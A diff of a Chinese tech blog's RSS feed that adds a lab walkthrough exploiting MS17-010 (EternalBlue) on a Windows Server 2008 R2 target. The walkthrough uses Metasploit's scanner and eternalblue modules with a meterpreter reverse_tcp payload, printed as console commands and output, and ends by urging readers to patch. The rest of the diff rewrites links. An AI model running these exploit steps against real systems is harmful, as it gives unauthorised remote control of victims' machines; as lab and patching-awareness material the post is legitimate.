@@ -3,11 +3,123 @@
   <channel>
     <title>CodeShurrik</title>
     <description>shurrik·s blog</description>
-    <link>http://localhost:4000/</link>
-    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 01 Nov 2019 14:11:37 +0800</pubDate>
-    <lastBuildDate>Fri, 01 Nov 2019 14:11:37 +0800</lastBuildDate>
+    <link>/blog/</link>
+    <atom:link href="/blog/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Mon, 11 Nov 2019 10:19:20 +0800</pubDate>
+    <lastBuildDate>Mon, 11 Nov 2019 10:19:20 +0800</lastBuildDate>
     <generator>Jekyll v3.8.6</generator>
+    
+      <item>
+        <title>ms17-010渗透测试</title>
+        <description>&lt;p&gt;主机工程师每天的一项日常工作就是给系统打各种补丁，我之前一直不以为然，认为这些补丁都可有可无。最近实践了下大名鼎鼎的ms17-010永恒之蓝，让我改变了这一想法。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555108-ee55d800-0466-11ea-8e6a-6d93d8481c54.png&quot; alt=&quot;漏洞&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;主机：kali   192.168.106.242&lt;/p&gt;
+
+  &lt;p&gt;靶机：Windows Server 2008 R2   192.168.106.240&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;永恒之蓝是以前玩剩下的了，现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化，内网中用17-010去测一测会发现意外惊喜。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555461-dd0dcb00-0468-11ea-89b7-5fcc0f92abbe.png&quot; alt=&quot;search&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;搜索到了4个相关的模块：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;auxiliary/admin/smb/ms17_010_command&lt;/li&gt;
+  &lt;li&gt;auxiliary/scanner/smb/smb_ms17_010&lt;/li&gt;
+  &lt;li&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/li&gt;
+  &lt;li&gt;exploit/windows/smb/ms17_010_psexec&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;先使用&lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/scanner/smb/smb_ms17_010&lt;/code&gt;扫描可能含有ms17-010漏洞的服务器。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/smb/smb_ms17_010
+msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options
+
+Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   Name         Current Setting                                                 Required  Description
+   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;                                                 &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+   CHECK_ARCH   &lt;span class=&quot;nb&quot;&gt;true                                                            &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;architecture on vulnerable hosts
+   CHECK_DOPU   &lt;span class=&quot;nb&quot;&gt;true                                                            &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   &lt;span class=&quot;nb&quot;&gt;false                                                           &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;List of named pipes to check
+   RHOSTS                                                                       &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address range or CIDR identifier
+   RPORT        445                                                             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The SMB service port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   SMBDomain    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                               no        The Windows domain to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authentication
+   SMBPass                                                                      no        The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The number of concurrent threads
+
+msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555634-9c628180-0469-11ea-8ad9-dd0df9bda69b.png&quot; alt=&quot;QQ截图20191111095648&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到靶机的ms17-010漏洞被扫描出来了。&lt;/p&gt;
+
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/code&gt;攻击，这里设置meterpreter的payload。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rhosts 192.168.106.240
+rhosts &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 192.168.106.240
+msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/meterpreter/reverse_tcp
+payload &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
+msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost 192.168.106.242
+lhost &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 192.168.106.242
+msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options
+
+Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   Name           Current Setting  Required  Description
+   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;           &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+   RHOSTS         192.168.106.240  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address range or CIDR identifier
+   RPORT          445              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   SMBDomain      &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The Windows domain to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authentication
+   SMBPass                         no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the specified username
+   SMBUser                         no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The username to authenticate as
+   VERIFY_ARCH    &lt;span class=&quot;nb&quot;&gt;true             yes       &lt;/span&gt;Check &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;remote architecture matches exploit Target.
+   VERIFY_TARGET  &lt;span class=&quot;nb&quot;&gt;true             yes       &lt;/span&gt;Check &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;remote OS matches exploit Target.
+
+
+Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   Name      Current Setting  Required  Description
+   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
+   EXITFUNC  thread           &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Exit technique &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Accepted: &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, seh, thread, process, none&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   LHOST     192.168.106.242  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   LPORT     4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port
+
+
+Exploit target:
+
+   Id  Name
+   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+   0   Windows 7 and Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; All Service Packs
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555823-75587f80-046a-11ea-86c6-ff2cb296fa2b.png&quot; alt=&quot;攻击成功&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;exploit成功，接下来就可以为所欲为了~~&lt;/p&gt;
+
+&lt;p&gt;所以说补丁还是得勤打，特别是永恒之蓝这种级别的漏洞，毕竟各大厂商不是吃白饭的。&lt;/p&gt;
+</description>
+        <pubDate>Mon, 11 Nov 2019 00:00:00 +0800</pubDate>
+        <link>/blog/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+        <guid isPermaLink="true">/blog/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+        
+        <category>渗透</category>
+        
+        <category>Linux</category>
+        
+        
+        <category>Windows</category>
+        
+      </item>
     
       <item>
         <title>Anycast实现DNS高可用</title>
@@ -55,8 +167,8 @@
 
 </description>
         <pubDate>Tue, 10 Sep 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2019-09-10/AnyCast%E5%AE%9E%E7%8E%B0DNS%E9%AB%98%E5%8F%AF%E7%94%A8/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019-09-10/AnyCast%E5%AE%9E%E7%8E%B0DNS%E9%AB%98%E5%8F%AF%E7%94%A8/</guid>
+        <link>/blog/2019-09-10/AnyCast%E5%AE%9E%E7%8E%B0DNS%E9%AB%98%E5%8F%AF%E7%94%A8/</link>
+        <guid isPermaLink="true">/blog/2019-09-10/AnyCast%E5%AE%9E%E7%8E%B0DNS%E9%AB%98%E5%8F%AF%E7%94%A8/</guid>
         
         <category>DNS</category>
         
@@ -218,8 +330,8 @@ ip addr
 &lt;p&gt;通过 network namespace 可以创建相互独立的网络栈，从而实现网络的隔离。其中 network namespace 之间通过 bridge 通信的方式已经与 docker 网络的 bridge 模式非常类似了，剩下的不过就是开启ip.forward，添加NAT规则等等。&lt;/p&gt;
 </description>
         <pubDate>Tue, 20 Aug 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2019-08-20/Linux-namespace/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019-08-20/Linux-namespace/</guid>
+        <link>/blog/2019-08-20/Linux-namespace/</link>
+        <guid isPermaLink="true">/blog/2019-08-20/Linux-namespace/</guid>
         
         <category>容器</category>
         
@@ -370,8 +482,8 @@ listening on docker0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/spa
 &lt;/ol&gt;
 </description>
         <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2019-07-17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3UDP/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019-07-17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3UDP/</guid>
+        <link>/blog/2019-07-17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3UDP/</link>
+        <guid isPermaLink="true">/blog/2019-07-17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3UDP/</guid>
         
         <category>容器</category>
         
@@ -646,8 +758,8 @@ PING bbox2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.104.0&lt;span c
 &lt;/blockquote&gt;
 </description>
         <pubDate>Thu, 06 Jun 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2019-06-06/Docker%E9%83%A8%E7%BD%B2Calico%E7%BD%91%E7%BB%9C/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019-06-06/Docker%E9%83%A8%E7%BD%B2Calico%E7%BD%91%E7%BB%9C/</guid>
+        <link>/blog/2019-06-06/Docker%E9%83%A8%E7%BD%B2Calico%E7%BD%91%E7%BB%9C/</link>
+        <guid isPermaLink="true">/blog/2019-06-06/Docker%E9%83%A8%E7%BD%B2Calico%E7%BD%91%E7%BB%9C/</guid>
         
         <category>容器</category>
         
@@ -735,8 +847,8 @@ PING bbox2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.104.0&lt;span c
 &lt;p&gt;　　因为那些人从来不顾别人的感受，野蛮、粗暴、横冲直撞，无时不刻的置自己与别人于危险之中浑然不觉甚至洋洋自得。我们没有文化的人就是这样的？.jpg&lt;/p&gt;
 </description>
         <pubDate>Wed, 17 Apr 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2019-04-17/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-2.%E5%BC%80%E8%BD%A6/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019-04-17/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-2.%E5%BC%80%E8%BD%A6/</guid>
+        <link>/blog/2019-04-17/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-2.%E5%BC%80%E8%BD%A6/</link>
+        <guid isPermaLink="true">/blog/2019-04-17/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-2.%E5%BC%80%E8%BD%A6/</guid>
         
         <category>游记</category>
         
@@ -985,8 +1097,8 @@ PING bbox2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.104.0&lt;span c
 &lt;p&gt;　　如果想在生产中使用 prometheus 和 grafana，请参考 &lt;a href=&quot;https://prometheus.io/docs/introduction/overview/&quot;&gt;官方文档&lt;/a&gt; 。&lt;/p&gt;
 </description>
         <pubDate>Tue, 05 Mar 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2019-03-05/%E4%BD%BF%E7%94%A8-prometheus-%E5%92%8C-grafana-%E7%9B%91%E6%8E%A7-linux-%E6%9C%BA%E5%99%A8/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019-03-05/%E4%BD%BF%E7%94%A8-prometheus-%E5%92%8C-grafana-%E7%9B%91%E6%8E%A7-linux-%E6%9C%BA%E5%99%A8/</guid>
+        <link>/blog/2019-03-05/%E4%BD%BF%E7%94%A8-prometheus-%E5%92%8C-grafana-%E7%9B%91%E6%8E%A7-linux-%E6%9C%BA%E5%99%A8/</link>
+        <guid isPermaLink="true">/blog/2019-03-05/%E4%BD%BF%E7%94%A8-prometheus-%E5%92%8C-grafana-%E7%9B%91%E6%8E%A7-linux-%E6%9C%BA%E5%99%A8/</guid>
         
         <category>容器</category>
         
@@ -1038,8 +1150,8 @@ PING bbox2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.104.0&lt;span c
 &lt;p&gt;　　反过来说，自知自己能力还达不到岗位要求也不用担心，不胜任是常态，以胜任为目标就好啦。&lt;/p&gt;
 </description>
         <pubDate>Mon, 28 Jan 2019 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2019-01-28/2018%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
-        <guid isPermaLink="true">http://localhost:4000/2019-01-28/2018%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
+        <link>/blog/2019-01-28/2018%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
+        <guid isPermaLink="true">/blog/2019-01-28/2018%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
         
         <category>年终总结</category>
         
@@ -1443,8 +1555,8 @@ u.save!
 &lt;p&gt;系统管理–&amp;gt;全局安全配置，勾选匿名用户具有可读权限和去掉CSRF防止跨站点请求伪造&lt;/p&gt;
 </description>
         <pubDate>Tue, 06 Nov 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018-11-06/%E5%9F%BA%E4%BA%8EDocker+Jenkins+Gitlab%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018-11-06/%E5%9F%BA%E4%BA%8EDocker+Jenkins+Gitlab%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83/</guid>
+        <link>/blog/2018-11-06/%E5%9F%BA%E4%BA%8EDocker+Jenkins+Gitlab%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83/</link>
+        <guid isPermaLink="true">/blog/2018-11-06/%E5%9F%BA%E4%BA%8EDocker+Jenkins+Gitlab%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83/</guid>
         
         <category>容器</category>
         
@@ -1645,181 +1757,13 @@ u.save!
 &lt;p&gt;共计: 花了4W多，如果不买东西的话，其实全程花费不算贵。&lt;/p&gt;
 </description>
         <pubDate>Fri, 28 Sep 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018-09-28/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-1.%E5%87%86%E5%A4%87/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018-09-28/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-1.%E5%87%86%E5%A4%87/</guid>
+        <link>/blog/2018-09-28/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-1.%E5%87%86%E5%A4%87/</link>
+        <guid isPermaLink="true">/blog/2018-09-28/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-1.%E5%87%86%E5%A4%87/</guid>
         
         <category>游记</category>
         
         
         <category>随行</category>
-        
-      </item>
-    
-      <item>
-        <title>深入理解装饰器</title>
-        <description>&lt;p&gt;　　等offer等得心慌，写写之前面试遇到的坑吧。&lt;/p&gt;
-
-&lt;p&gt;　　面试官：看你简历写了熟悉python？&lt;/p&gt;
-
-&lt;p&gt;　　我：…会一点,shell脚本写得比较多&lt;/p&gt;
-
-&lt;p&gt;　　面试官：那你给我讲讲装饰器吧&lt;/p&gt;
-
-&lt;p&gt;　　我：…呵呵&lt;/p&gt;
-
-&lt;p&gt;　　之前只是了解python的函数式编程，大概知道装饰器(decorator)是在代码运行期间动态增加功能同时又不改变原有代码。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&amp;lt; 函数+返回值高阶函数+实参高阶函数+嵌套函数+语法糖 = 装饰器 &amp;gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;　　你能看懂吗？反正我是没看懂，所以一个一个的查了后才略有理解：装饰器本质上还是函数。&lt;/p&gt;
-
-&lt;h2 id=&quot;函数&quot;&gt;函数&lt;/h2&gt;
-
-&lt;p&gt;　　理解装饰器前，需要明白函数的工作原理，我们先从一个最简单函数定义开始：&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　上面定义了一个函数，名字叫foo，也可以把 foo 可理解为变量名，该变量指向一个函数对象&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://shurriklab.qiniudn.com/18-8-24/81273610.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;　　调用函数只需要给函数名加上括号并传递必要的参数（如果函数定义的时候有参数的话）&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 4
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　变量名 foo 现在指向 &amp;lt;function foo at 0x1030060c8&amp;gt; 函数对象，但它也可以指向另外一个函数&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bar&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bar&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# bar()
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://shurriklab.qiniudn.com/18-8-24/26546525.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;返回值高阶函数&quot;&gt;返回值高阶函数&lt;/h2&gt;
-
-&lt;p&gt;在Python中，一切皆为对象，函数也不例外，它可以像整数一样作为其它函数的返回值，例如：&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
- 
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;
- 
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &amp;lt;function foo at 0x10a2f4140&amp;gt;
-&lt;/span&gt; 
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 1 
-# 等价于
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;　　调用函数 bar() 的返回值是一个函数对象 &amp;lt;function foo at 0x10a2f4140&amp;gt;，因为返回值是函数，所以我们可以继续对返回值进行调用（记住：调用函数就是在函数名后面加()）调用bar()()相当于调用 foo()，因为 变量 foo 指向的对象与 bar() 的返回值是同一个对象。&lt;/p&gt;
-
-&lt;h2 id=&quot;实参高阶函数&quot;&gt;实参高阶函数&lt;/h2&gt;
-
-&lt;p&gt;　　函数还可以像整数一样作为函数的参数，例如：&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
- 
